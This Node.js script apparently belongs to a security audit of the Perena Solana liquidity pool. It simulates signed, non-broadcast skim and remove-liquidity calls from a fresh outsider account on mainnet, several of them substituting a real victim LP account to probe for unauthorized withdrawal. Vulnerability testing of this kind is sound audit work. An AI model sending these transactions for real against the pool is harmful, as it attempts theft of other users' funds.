#!/usr/bin/env node
'use strict';

// Signed non-broadcast sibling checks for Perena's other pool-value paths:
// remove_liquidity, remove_all_liquidity, and skim. All calls use the current
// mainnet-beta bank through simulateTransaction with sigVerify:true.

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const MOD = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const {ComputeBudgetProgram, Keypair, PublicKey, TransactionInstruction,
  TransactionMessage, VersionedTransaction} = require(MOD + '/@solana/web3.js');
const {TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID,
  getAssociatedTokenAddressSync, createAssociatedTokenAccountIdempotentInstruction} =
  require(MOD + '/@solana/spl-token');

const ENV_PATH = '/private/tmp/codex-mainnet-rpc-2026-10-19.env';
const KEY_PATH = '/Users/stacc/hooked.json';
const OUT = path.join(__dirname, 'perena-liquidity-sibling-mutations.json');
const EXPECTED_GENESIS = '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d';
const P = value => new PublicKey(value);
const IDS = {
  program: P('NUMERUNsFCP3kuNmWZuXtm1AaQCPj9uw6Guv2Ekoi5P'),
  pool: P('2w4A1eGyjRutakyFdmVyBiLPf98qKxNTC2LpuwhaCruZ'),
  lpMint: P('BenJy1n3WTx9mTjEvy63e8Q1j4RqUc6E4VBMz3ir4Wo6'),
  victimLpAta: P('2zwN9E2PdPyYTMQp8rnvpREANvMLDmZs5Sx663d5YBxd'),
  config: P('FS159v4b2jo3fjGBaUFmDzgx7k616XhpKhMwX2Q3HeeD'),
  usdc: P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'),
  usdcVault: P('6B8k8At9879r5EsZAWg8W6DEpxzJ798Cwj48twu3pq4b'),
  usdt: P('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'),
  usdtVault: P('DJfYbGicp4AFXWsragNWv1baugqcdFhw6eFTcK2YWdyK'),
  pyusd: P('2b1kV6DkPAnxd5ixfnxCpjxmKwqjjaYmCZfHsFu24GXo'),
  pyusdVault: P('4jV62TqjV4oUyNBioPo9dJZGyjTcgfBDkuG4VbgxfqWC'),
};
const DISC = {
  remove: Buffer.from([80, 85, 209, 72, 24, 206, 177, 108]),
  removeAll: Buffer.from([10, 51, 61, 35, 112, 105, 24, 85]),
  skim: Buffer.from([238, 120, 221, 138, 82, 60, 100, 218]),
};

function loadRpc() {
  const values = {};
  for (const raw of fs.readFileSync(ENV_PATH, 'utf8').split(/\r?\n/)) {
    const match = /^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(raw.trim());
    if (match) values[match[1]] = match[2].replace(/^(["'])(.*)\1$/, '$2');
  }
  const endpoint = values.RPC || values.SOLANA_RPC || values.SOLANA_RPC_URL || values.RPC_URL ||
    values.HEAVY_RPC_URL || values.HELIUS_RPC_URL;
  if (!endpoint) throw new Error('RPC variable unavailable');
  return endpoint;
}

const RPC = loadRpc();
let rpcId = 0;
async function rpc(method, params = []) {
  let last;
  for (let attempt = 0; attempt < 8; attempt += 1) {
    try {
      const response = await fetch(RPC, {method: 'POST', headers: {'content-type': 'application/json'},
        body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params}),
        signal: AbortSignal.timeout(60_000)});
      const body = await response.json();
      if (response.ok && !body.error) return body.result;
      last = new Error(`${method}: ${JSON.stringify(body.error || body).slice(0, 1000)}`);
    } catch (error) { last = error; }
    await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)));
  }
  throw last;
}

function tokenAmount(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}
function meta(pubkey, writable = false, signer = false) { return {pubkey, isWritable: writable, isSigner: signer}; }
function removeData() {
  const data = Buffer.alloc(97);
  DISC.remove.copy(data, 0);
  data.writeBigUInt64LE(1n, 8); // one raw LP token; outsider owns zero
  data[96] = 0; // redeem to the USDC output slot
  return data;
}
function sha256(data) { return crypto.createHash('sha256').update(data).digest('hex'); }

function commonKeys(outsider, outsiderLpAta, payerLpOverride = outsiderLpAta) {
  return [meta(IDS.pool, true), meta(IDS.lpMint, true), meta(payerLpOverride, true),
    meta(IDS.config), meta(outsider, false, true), meta(TOKEN_PROGRAM_ID), meta(TOKEN_2022_PROGRAM_ID)];
}
function remainingTriples(outsiderUsdcAta) {
  return [meta(IDS.usdcVault, true), meta(outsiderUsdcAta, true), meta(IDS.usdc),
    meta(IDS.usdtVault, true), meta(IDS.program), meta(IDS.usdt),
    meta(IDS.pyusdVault, true), meta(IDS.program), meta(IDS.pyusd)];
}
function instruction(kind, outsider, outsiderLpAta, outsiderUsdcAta, payerLpOverride) {
  const data = kind === 'remove' ? removeData() : DISC[kind];
  return new TransactionInstruction({programId: IDS.program,
    keys: [...commonKeys(outsider, outsiderLpAta, payerLpOverride), ...remainingTriples(outsiderUsdcAta)], data});
}

async function simulate(label, feePayer, outsider, instructions, watch) {
  const latest = await rpc('getLatestBlockhash', [{commitment: 'confirmed'}]);
  const message = new TransactionMessage({payerKey: feePayer.publicKey,
    recentBlockhash: latest.value.blockhash, instructions}).compileToV0Message();
  const tx = new VersionedTransaction(message);
  const required = message.staticAccountKeys.slice(0, message.header.numRequiredSignatures).map(String);
  tx.sign([feePayer, outsider].filter(k => required.includes(k.publicKey.toBase58())));
  const wire = Buffer.from(tx.serialize());
  const result = await rpc('simulateTransaction', [wire.toString('base64'), {encoding: 'base64',
    sigVerify: true, replaceRecentBlockhash: false, commitment: 'confirmed', innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watch.map(String)}}]);
  return {label, contextSlot: result.context.slot, err: result.value.err,
    unitsConsumed: result.value.unitsConsumed, logs: result.value.logs || [],
    returnedTokenAmounts: (result.value.accounts || []).map(tokenAmount),
    envelope: {wireBytes: wire.length, accountKeys: message.staticAccountKeys.length,
      requiredSignatures: message.header.numRequiredSignatures, signerPublicKeys: required,
      wireSha256: sha256(wire)}, sigVerify: true, replaceRecentBlockhash: false};
}

async function main() {
  const genesis = await rpc('getGenesisHash');
  if (genesis !== EXPECTED_GENESIS) throw new Error(`wrong genesis ${genesis}`);
  const feePayer = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(KEY_PATH, 'utf8'))));
  const outsider = Keypair.generate();
  const outsiderLpAta = getAssociatedTokenAddressSync(IDS.lpMint, outsider.publicKey);
  const outsiderUsdcAta = getAssociatedTokenAddressSync(IDS.usdc, outsider.publicKey);
  const setup = [ComputeBudgetProgram.setComputeUnitLimit({units: 900_000}),
    createAssociatedTokenAccountIdempotentInstruction(feePayer.publicKey, outsiderLpAta,
      outsider.publicKey, IDS.lpMint, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID),
    createAssociatedTokenAccountIdempotentInstruction(feePayer.publicKey, outsiderUsdcAta,
      outsider.publicKey, IDS.usdc, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID)];
  const watch = [outsiderLpAta, IDS.victimLpAta, IDS.usdcVault, IDS.usdtVault,
    IDS.pyusdVault, outsiderUsdcAta];
  const tests = [];
  tests.push(await simulate('setup_only_same_bank_baseline', feePayer, outsider, setup, watch));
  tests.push(await simulate('fresh_outsider_skim', feePayer, outsider,
    [...setup, instruction('skim', outsider.publicKey, outsiderLpAta, outsiderUsdcAta)], watch));
  tests.push(await simulate('skim_with_victim_lp_account_authority_substitution', feePayer, outsider,
    [...setup, instruction('skim', outsider.publicKey, outsiderLpAta, outsiderUsdcAta, IDS.victimLpAta)], watch));
  tests.push(await simulate('fresh_outsider_remove_one_raw_lp_with_zero_balance', feePayer, outsider,
    [...setup, instruction('remove', outsider.publicKey, outsiderLpAta, outsiderUsdcAta)], watch));
  tests.push(await simulate('remove_with_victim_lp_account_authority_substitution', feePayer, outsider,
    [...setup, instruction('remove', outsider.publicKey, outsiderLpAta, outsiderUsdcAta, IDS.victimLpAta)], watch));
  tests.push(await simulate('remove_all_with_victim_lp_account_authority_substitution', feePayer, outsider,
    [...setup, instruction('removeAll', outsider.publicKey, outsiderLpAta, outsiderUsdcAta, IDS.victimLpAta)], watch));
  const baseline = tests[0];
  const testDeltas = Object.fromEntries(tests.slice(1).map(test => [test.label,
    Object.fromEntries(watch.map((address, i) => [address.toBase58(),
      test.returnedTokenAmounts[i] == null || baseline.returnedTokenAmounts[i] == null ? null :
        (BigInt(test.returnedTokenAmounts[i]) - BigInt(baseline.returnedTokenAmounts[i])).toString()]))]));
  const output = {schema: 'perena-liquidity-sibling-mutations/v1', generatedAtUtc: new Date().toISOString(),
    network: 'mainnet-beta read-only simulateTransaction', genesis,
    signer: {feePayerPublicKey: feePayer.publicKey.toBase58(),
      freshOutsiderPublicKey: outsider.publicKey.toBase58(), outsiderSecretPersisted: false},
    target: Object.fromEntries(Object.entries(IDS).map(([key, value]) => [key, value.toBase58()])),
    outsiderAccounts: {lpAta: outsiderLpAta.toBase58(), usdcAta: outsiderUsdcAta.toBase58()},
    watchAddresses: watch.map(String), tests, deltasVersusSetupOnlyRaw: testDeltas,
    safety: {sigVerify: true, simulationsOnly: true, sendTransactionCalled: false,
      transactionSubmitted: false, broadcast: false, freshOutsiderSecretPersisted: false}};
  fs.writeFileSync(OUT, JSON.stringify(output, null, 2) + '\n');
  console.log(JSON.stringify({output: OUT, generatedAtUtc: output.generatedAtUtc, signer: output.signer,
    outsiderAccounts: output.outsiderAccounts,
    tests: tests.map(test => ({label: test.label, contextSlot: test.contextSlot, err: test.err,
      unitsConsumed: test.unitsConsumed, envelope: test.envelope, logTail: test.logs.slice(-14)})),
    deltasVersusSetupOnlyRaw: testDeltas, safety: output.safety}, null, 2));
}

main().catch(error => { console.error(error.stack || error); process.exit(1); });
